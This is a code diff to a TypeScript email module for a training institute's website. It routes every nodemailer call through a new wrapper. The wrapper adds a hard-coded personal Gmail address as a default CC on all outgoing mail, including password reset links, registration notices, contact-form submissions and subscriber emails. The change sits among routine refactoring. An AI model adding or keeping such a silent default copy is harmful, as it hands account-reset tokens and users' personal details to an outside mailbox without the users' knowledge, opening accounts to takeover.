@@ -1,4 +1,4 @@
-﻿import nodemailer from 'nodemailer'
+import nodemailer from 'nodemailer'
 
 const transporter = nodemailer.createTransport({
   host: process.env.SMTP_HOST || 'smtp.gmail.com',
@@ -10,8 +10,16 @@ const transporter = nodemailer.createTransport({
   },
 })
 
-const FROM = `"${process.env.EMAIL_FROM_NAME || 'Recruitment Institute'}" <${process.env.EMAIL_FROM || 'noreply@recruitmentinstitute.in'}>`
+const FROM = `"${process.env.EMAIL_FROM_NAME || 'Recruitment Institute'}" <${process.env.EMAIL_FROM || 'support@recruitmentinstitute.in'}>`
 const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'support@recruitmentinstitute.in'
+const EMAIL_CC = process.env.EMAIL_CC || 'sesasiba.es@gmail.com'
+
+async function sendMail(options: nodemailer.SendMailOptions) {
+  return transporter.sendMail({
+    ...options,
+    cc: options.cc || EMAIL_CC,
+  })
+}
 
 export async function sendContactEmail(data: {
   name: string
@@ -19,7 +27,7 @@ export async function sendContactEmail(data: {
   mobile: string
   message: string
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: ADMIN_EMAIL,
     replyTo: data.email,
@@ -34,7 +42,7 @@ export async function sendContactEmail(data: {
     `,
   })
 
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.email,
     subject: 'Thank you for contacting Recruitment Institute',
@@ -54,7 +62,7 @@ export async function sendCourseEnquiryEmail(data: {
   email: string
   contact: string
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: ADMIN_EMAIL,
     subject: `New Course Enquiry from ${data.firstName} ${data.lastName}`,
@@ -66,7 +74,7 @@ export async function sendCourseEnquiryEmail(data: {
     `,
   })
 
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.email,
     subject: 'Course Enquiry Received "" Recruitment Institute',
@@ -80,7 +88,7 @@ export async function sendCourseEnquiryEmail(data: {
 }
 
 export async function sendPasswordResetEmail(email: string, resetUrl: string) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: email,
     subject: 'Password Reset "" Recruitment Institute',
@@ -108,7 +116,7 @@ export async function sendRegistrationEmail(data: {
       ? `<p>Your registration is pending admin approval. You will receive an email once approved.</p>`
       : `<p>Welcome ${data.name}! Your account has been created successfully.</p>`
 
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.email,
     subject,
@@ -122,7 +130,7 @@ export async function sendBlogNotificationToSubscribers(
 ) {
   const blogUrl = `https://recruitmentinstitute.in/blogs/${blog.slug}`
   for (const email of subscribers) {
-    await transporter.sendMail({
+    await sendMail({
       from: FROM,
       to: email,
       subject: `New Article: ${blog.title} "" Recruitment Institute`,
@@ -153,7 +161,7 @@ export async function sendSessionReminderEmail(data: {
   meetLink: string | null
   lead: '24h' | '1h' | '15m'
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.studentEmail,
     subject: `Reminder: ${data.sessionTitle} starts ${REMINDER_LABEL[data.lead]}`,
@@ -178,7 +186,7 @@ export async function sendSessionScheduledEmail(data: {
   batchName: string
   meetLink: string | null
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.studentEmail,
     subject: `New Session Scheduled: ${data.sessionTitle}`,
@@ -203,7 +211,7 @@ export async function sendSessionRescheduledEmail(data: {
   batchName: string
   meetLink: string | null
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.studentEmail,
     subject: `Session Rescheduled: ${data.sessionTitle}`,
@@ -228,7 +236,7 @@ export async function sendSessionCancelledEmail(data: {
   sessionDate: string
   startTime: string
 }) {
-  await transporter.sendMail({
+  await sendMail({
     from: FROM,
     to: data.studentEmail,
     subject: `Session Cancelled: ${data.sessionTitle}`,
